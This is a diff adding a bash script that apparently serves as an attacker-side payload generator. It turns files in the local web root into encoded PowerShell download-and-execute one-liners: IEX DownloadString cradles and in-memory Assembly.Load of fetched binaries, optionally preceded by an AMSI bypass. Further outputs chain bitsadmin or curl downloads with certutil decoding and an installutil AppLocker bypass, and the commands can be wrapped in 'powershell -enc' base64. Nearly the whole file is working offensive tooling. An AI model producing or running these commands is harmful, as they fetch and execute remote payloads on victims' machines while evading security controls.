@@ -1,0 +1,257 @@
+#!/bin/bash
+
+bname=$(basename $0)
+IP=""
+
+WEBDIR="/var/www/html"
+runcode=""
+iface="tun0"
+winb64=0
+data=""
+bits=0
+curl=0
+bpappl=0
+iex=0
+down=0
+twoiter=0
+psdec=0
+file=""
+outpath="%USERPROFILE%"
+incamsi=0
+
+amsibp=0
+amsibpcode=""
+
+usage() {
+	echo "Arguments: "
+	echo "--runcode  | -r ... RunCode for powershell DLL loader (eg. [Program]::Main() / \"\$arg=@(\"dum\",\"dum\");[Job.Program]::Main(\$arg)\" )"
+	echo "--iface    | -i ... interface"
+	echo "--winb64   | -w ... windows unicode encoding base64 output"
+	echo "--data     | -d ... any data (mostly used for encoding to base64"
+	echo "--bits     | -b ... download with bitsadmin"
+	echo "--curl     | -c ... download with curl"
+	echo "--bpappl   |    ... bypass applockeru with installer - method needs implement unistall"
+	echo "--iex      | -x ... Generate Invoke-Expression call"
+	echo "--outpath  | -o ... output path for applocker bypass; def and eg. %USERPROFILE%"
+	echo "--down     | -w ... powershell download cradle"
+	echo "--help     | -h ... this help"
+	echo "--twoiter  |    ... powershell specific @ two b64 iterations, include decoding csharp call"
+	echo "--psdec    | -p ... include 'powershell --enc <b64string>'"
+	echo "--file     | -f ... file to use"
+	echo "--incamsi  | -a ... powershell specific @ include asmi bypass file as iex"
+	echo "--amsibp   |    ... powershell specific @ include amsi bypass code before IEX"
+	echo "----------- HELPER SHORTCUTS --------"
+	echo "getunicodeb64   ... "
+	echo "getapplocker    ... "
+	echo "getiex          ... "
+	echo "getassm         ... "
+	echo "getwget         ... "
+	echo "getdownlink     ... "
+	exit 0
+}
+
+
+
+opt=$(getopt -l "runcode:,help,iface:,winb64,bits,data:,curl,bpappl,iex,down,twoiter,psdec,file:,incamsi:,amsibp" -a -o ":aphbnxi:d:f:" -- "$@")
+eval set -- "$opt"
+#echo $@
+
+while true;do
+        case $1 in
+		--amsibp)
+			amsibp=1
+			;;
+		--incamsi|-a)
+			incamsi=1
+			;;
+		--psdec|-p)
+			psdec=1
+			;;
+		--runcode|-r)
+			shift
+			runcode=$1
+			;;
+		--outpath|-o)
+			shift
+			outpath=$1
+			;;
+		--iface|-i)
+			shift
+			iface=$1
+                        ;;
+		--winb64|-w)
+			winb64=1
+			;;
+                --data|-d)
+			shift
+			data="$1"
+                        ;;
+                --bits|-b)
+			bits=1
+                        ;;
+                --curl|-c)
+			curl=1
+                        ;;
+		--bpappl)
+			bpappl=1
+			;;
+		--iex|-x)
+			iex=1
+			;;
+		--down|-w)
+			down=1
+			;;
+		--twoiter)
+			twoiter=1
+			;;
+		--file|-f)
+			shift
+			file=$1
+			;;
+		--help|-h)
+			usage
+			exit 0
+			;;
+		--)
+			shift
+			break;
+			;;
+        esac
+	shift
+done
+
+TEXT=""
+
+wb64() {
+	text="$1"	
+	text=$(echo -n "$text" | iconv -f utf-8 -t utf-16le | base64 -w0)
+	if [ $twoiter -eq 0 ]&&[ $psdec -eq 1 ];then
+		text="powershell -enc $text"
+	fi
+	TEXT=$text
+}
+
+twoiterb64() {	
+	text=$1
+	wb64 "$text"
+	tpl="IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$TEXT')))"
+	wb64 "$tpl"
+	if [ $psdec -eq 1 ];then
+		text="powershell -enc $TEXT"
+	fi
+	TEXT=$text
+}
+
+encode() {
+	if [ $twoiter -eq 1 ];then
+		twoiterb64 "$1"
+	elif [ $winb64 -eq 1 ];then
+		wb64 "$1"
+	else
+		TEXT=$1
+	fi
+}
+
+FILEPATH=""
+FILENAME=""
+FILENOSUFFIX=""
+
+find_file() {
+	file=$(find $WEBDIR -iname "$1" -exec ls {} \; | sed 's/\/var\/www\/html\///')
+	FILEPATH=$file
+	FILENAME=$(echo ${file##*/})
+	if [ -z "$FILEPATH" ]||[ -z "$FILENAME" ];then
+		echo "[!] Empty file, not found? ($1 / $file / $FILEPATH / $FILENAME)"
+		exit 0
+	fi
+	FILENOSUFFIX=$(echo ${FILENAME%%.*})
+}
+
+emptyf() {
+	if [ -z "$file" ];then
+		echo "[!] Missig --file !"
+		exit 1
+	fi
+}
+
+getamsibp() {
+	if [ $amsibp -eq 1 ];then
+		amsibpcode="$(cat /var/www/html/tools/amsibp_singleline.txt);"
+		if [ -z "$amsibpcode" ];then
+			echo -e "\e[31m[!] Failed to load AMSI bypass code!\e[0m"
+		fi
+	else
+		amsibpcode=""
+	fi
+}
+
+if [ "$bname" != "getunicodeb64" ];then
+	IP=$(ip -4 -p -j a s $iface | jq -r '.[0].addr_info[0].local')
+	if [ -z "$IP" ];then
+		echo "[!] Missing interface, requested --iface $iface"
+		exit 0
+	fi
+fi
+
+getamsibp
+
+case $bname in
+	getunicodeb64)
+		winb64=1
+		if [ -z "$data" ];then
+			echo "[!] Need data to encode!"
+		fi
+		encode "$data"
+		echo $TEXT
+		;;
+	getapplocker)
+		emptyf
+		if [ -z "$outpath" ];then
+			echo "[w] OutPath not specified, using default %USERPROFILE%"
+		fi
+		find_file "$file"
+		outpathfull="${outpath}\\\\$FILENAME"
+		bitstxt="bitsadmin /transfer ASDQED http://$IP/$FILEPATH $outpathfull"
+	        curltxt="curl http://$IP/$FILEPATH -o $outpathfull"
+		bypass=" && certutil -decode ${outpathfull} ${outpath}\\\\${FILENOSUFFIX}.exe"
+		applockbp=" && C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\installutil.exe /logfile= /LogToConsole=false /U ${outpath}\\\\${FILENOSUFFIX}.exe"
+		encode "${bitstxt}${bypass}${applockbp}"
+		echo $TEXT
+		encode "${curltxt}${bypass}${applockbp}"
+		echo $TEXT
+		;;
+	getiex)
+		emptyf
+		find_file "$file"
+		base="IEX((new-object System.Net.Webclient).DownloadString('http://$IP/$FILEPATH'))"
+		if [ ! -z "$data" ];then
+			base="${data};$base"
+		fi
+		#echo ${amsibpcode}${base}
+		encode "${amsibpcode}${base}"
+		echo $TEXT
+		;;
+	getassm)
+		emptyf
+		find_file "$file"
+		text1="\$data = ((New-Object System.Net.WebClient).DownloadData('http://$IP/$FILEPATH'))"
+		text2="\$assem = [System.Reflection.Assembly]::Load(\$data)"
+		encode "${amsibpcode}${text1};${text2};${runcode}"
+		echo $TEXT
+		;;
+	getwget)
+		emptyf
+		find_file "$file"
+		echo "wget http://$IP/$FILEPATH -O $FILENAME"
+		;;
+	getdownlink)
+		emptyf
+		find_file "$file"
+		echo "curl http://$IP/$FILEPATH -o $FILENAME"
+		;;
+	getcurl)
+		emptyf
+		find_file "$file"
+
+		;;
+esac
